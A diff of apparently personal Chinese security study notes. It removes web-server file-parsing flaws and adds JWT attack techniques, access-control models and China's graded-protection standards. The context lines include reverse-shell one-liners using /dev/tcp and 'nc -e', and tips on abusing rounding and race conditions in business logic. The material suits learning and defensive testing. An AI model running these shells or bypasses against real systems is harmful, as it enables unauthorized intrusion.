@@ -1,78 +1,3 @@
-# 中间件
-
-## Apache
-
-```yaml
-/etc/<包名>/:    # 配置文件。包名可能是apache, apache2, httpd, nginx等
-    - <包名>.conf        # 主配置文件
-    - ports.conf         # 监听端口配置
-    - sites-enabled/     # 虚拟主机配置
-    - mods-enabled/      # 模块配置
-    - conf-enabled/      # 其他配置
-
-/var/www/:
-    - html/              # 网站默认根目录
-
-/var/log/<包名>/:
-    - access.log         # 访问日志
-    - access_log
-    - error.log          # 错误日志
-    - error_log
-```
-
-**多后缀解析漏洞**
-
-Apache支持一个文件拥有多个后缀（参考：[mod_mime](https://httpd.apache.org/docs/current/mod/mod_mime.html)），比如使用以下配置，访问`index.cn.html`返回中文页面
-
-```htaccess
-AddType text/html .html
-AddLanguage zh-CN .cn
-```
-
-假如配置不当，如`AddHandler application/x-httpd-php .php`，那么服务器会认为`evil.php.jpg`这样“不是php”的文件也包含后缀`.php`，并当作php解析
-
-较新版本（应该是PHP 7+）的php配置文件（`php<版本号>.conf`）默认使用如下配置，不会产生多后缀解析漏洞
-
-```htaccess
-<FilesMatch ".+.php$">
-    SetHandler application/x-httpd-php
-</FilesMatch>
-```
-
-**换行解析漏洞**（CVE-2017-15715）
-
-Apache 2.4.0-2.4.29版本，访问`evil.php\x0A`，即`evil.php\n`，按照php文件解析
-
-## Nginx
-
-**自动修复路径漏洞**
-
-若配置Nginx的`cgi.fix_pathinfo=1`，cgi解析出错时会匹配上一级文件，比如`http://example.com/evil.jpg/non-exist.php`，这个文件不存在，就会尝试把`evil.jpg`交给PHP-FPM（这个配置的原意是修复`PATH_INFO`错误）
-
-若同时配置PHP-FPM的`security.limit_extensions=空`，则它可以解析任意后缀的文件，因此将`evil.jpg`作为php解析
-
-很久以前（应该是php 5.3）PHP-FPM的默认配置就改为了`security.limit_extensions = .php`，Nginx的默认配置也禁用了`cgi.fix_pathinfo`
-
-**文件名逻辑漏洞**（CVE-2013-4547）
-
-Nginx 0.8.41~1.4.3 / 1.5.0~1.5.7，若文件名包含`\x20\x00`就无法正确检测`\x00`
-
-上传文件`evil.jpg\x20`，访问`evil.jpg\x20\x00.php`，Nginx没有正确识别到`\x00`，认为它是正常php文件并发送给PHP-FPM；PHP-FPM读取文件名时被00截断，读取`evil.jpg\x20`。若同时配置了`security.limit_extensions=空`则会将`evil.jpg\x20`作为php解析
-
-## Tomcat
-
-**PUT方法任意写入文件**（CVE-2017-12615）
-
-Tomcat 8.5.19，若配置`readonly=false`，使用PUT方法就能上传任意文件。Tomcat会做后缀黑名单校验，可以用`shell.jsp/`等方式绕过
-
-## IIS
-
-**目录解析漏洞**：IIS 5.x / 6.0版本中，名为`*.asp, *.asa, *.cer, *.cdx`的目录中所有文件都解析为asp文件
-
-**文件名解析漏洞**：IIS 5.x / 6.0版本中，`evil.asp;.jpg`解析为asp文件
-
-**畸形解析漏洞**：IIS 7.0版本，与Nginx自动修复路径漏洞类似，开启Fast-CGI模式且`cgi.fix_pathinfo=1`，访问`evil.jpg/non-exist.php`，会将`evil.jpg`作为php文件解析
-
 # 读文章
 
 怎么做笔记：
@@ -91,7 +16,7 @@ Tomcat 8.5.19，若配置`readonly=false`，使用PUT方法就能上传任意文
 - 利用方法：提现带小数金额，查看账户余额变动与银行卡余额变动是否匹配
 - 遇到问题：找类似业务的功能点进行测试
 
-> 举一反三：整数参数都有可能有四舍五入导致的漏洞，比如手机号：13511112222和13511112222.1可能被当作不同手机号导致短信轰炸；比如资源id：有权访问`id=1`，无权访问`id=2`，尝试`id=1.9`有可能越权
+> 总结：整数参数都有可能有四舍五入导致的漏洞，比如手机号：13511112222和13511112222.1可能被当作不同手机号导致短信轰炸；比如资源id：有权访问`id=1`，无权访问`id=2`，尝试`id=1.9`有可能越权
 
 [一次并发高危投稿](https://mp.weixin.qq.com/s/XwJxFXNzeBdd78hINrnoLg)
 
@@ -100,7 +25,7 @@ Tomcat 8.5.19，若配置`readonly=false`，使用PUT方法就能上传任意文
 - 利用方法：多并发请求包
 - 遇到问题：找相似功能点
 
-> 举一反三：限制操作次数的功能并发通常都有较大危害，比如领券、抽奖、新用户优惠
+> 总结：限制操作次数的功能并发通常都有较大危害，比如领券、抽奖、新用户优惠
 
 [某src支付逻辑有误导致任意支付](https://mp.weixin.qq.com/s/SSgQf547szihmhjgr5AiJQ)
 
@@ -171,6 +96,15 @@ JWT（JSON Web Token）的原理是将会话信息存储在客户端。其结构
 
 通常放在Authorization字段或Cookie中传递
 
+JWT漏洞
+
+- CVE-2015-2951：将头部`alg`改为`none, None, NONE`等
+- CVE-2016-10555：将签名算法从非对称改为对称，如从RS256改为HS256，并用公钥签名
+- CVE-2018-1000531：在头部注入JWK，程序可能错误使用JWK中的密钥验证签名
+- CVE-2020-28042：删除签名部分
+- CVE-2022-21449：利用Java SE 17.0.2和18.0的ECDSA签名机制缺陷（此签名算法使用的圆锥曲线方程有一组平凡解$r=0, s=0$，验证签名时未正确处理该情况）
+- 弱密钥
+
 ## Cookie与Authorization
 
 身份凭据可以存储在Cookie，也可以存储在localStorage中
@@ -184,6 +118,21 @@ JWT（JSON Web Token）的原理是将会话信息存储在客户端。其结构
 有状态与无状态 - Session，Cookie与Token
 
 localStorage与sessionStorage
+
+## 访问控制的实现
+
+权限架构：
+
+- 基于**角色**（RBAC，Role-Based Access Control）：每个用户分配角色，每个接口按照角色判断是否允许访问。简单，粗粒度，可用于架构清晰的中小型系统
+- 基于**属性**（ABAC，Attribute-Based Access Control）：每个接口根据用户属性、资源属性、环境属性等动态条件控制。复杂，细粒度，主要用于较复杂系统（并且通常和基于角色的访问控制共同使用）
+- 基于**策略**（PBAC，Policy-Based Access Control）：定义一系列策略，规定各接口如何根据用户属性、资源属性等条件进行控制。复杂，细粒度，权限与业务解耦，主要用于需要合规审计的系统
+
+
+代码实现：
+
+- 路由配置
+- 接口权限
+- 数据行级权限
 
 # PTES Technical Guidelines
 
@@ -211,3 +160,59 @@ bash -i >& /dev/tcp/ip/port 0>&1  # 简单方便。需要bash和dev权限
 nc -e /bin/bash ip port           # 需要目标安装了nc
 ```
 
+## 业务
+
+- 预测阶段：资产发现、威胁情报、漏洞探测、风险评估
+- 防御阶段：策略配置、安全加固
+- 检测阶段：基线检查、安全审计、安全设备分析
+- 响应阶段：应急响应
+
+
+
+系统监控与维护：实时监控、故障处理、系统更新、数据备份
+
+安全设备管理：巡检、配置管理、特征库升级、安全报告
+
+应急响应
+
+风险评估与管理：基线检查、漏扫、风险评估
+
+培训与技术支持
+
+
+
+阶段性工作，如等保、护网、集团检查、上级单位考核；日常工作：巡检、漏扫、监控、分析告警、上报数据、安全设备运维
+
+
+
+## 等级保护
+
+2019年起，俗称”等保2.0“，依据标准包括：
+
+- GB/T 22239-2019 信息安全技术 网络安全等级保护基本要求
+- GB/T 25070-2019 信息安全技术 网络安全等级保护安全设计技术要求
+- GB/T 28448-2019 信息安全技术 网络安全等级保护测评要求
+
+定级备案
+
+| 级别 | 公民合法权益 | 社会秩序和公共利益 | 国家安全     | 例                                         |
+| ---- | ------------ | ------------------ | ------------ | ------------------------------------------ |
+| 一级 | 损害         | /                  | /            | 个人网站                                   |
+| 二级 | 严重损害     | 危害               | /            | 商业网站                                   |
+| 三级 |              | 严重危害           | 危害         | 政务、金融、能源、交通等重要行业的核心系统 |
+| 四级 |              | 特别严重危害       | 严重危害     | 重要行业的国家级核心系统                   |
+| 五级 |              |                    | 特别严重危害 | 国防、国家战略设施的核心系统               |
+
+等保是网络安全法要求的法定义务
+
+网站的定级备案由公安部负责；网络运行单位（电信企业、IDC、云服务商等）的定级备案由工信部负责
+
+[等保、分保、关保、密评四道防线守护网络信息安全](https://mp.weixin.qq.com/s?__biz=MzU2OTQxMjQ1OQ==&mid=2247485385&idx=1&sn=2c2879c8ea1cc3bb1a216a7ce423bbb1&chksm=fcfe59cdcb89d0dbe08bfabd693fa86e9d7cb88f016a4633217891a13be6ce0c2820bbd06302&scene=27)
+
+网络安全等级保护
+
+涉密信息系统分级保护
+
+关键信息基础设施保护
+
+商用密码应用安全性评估
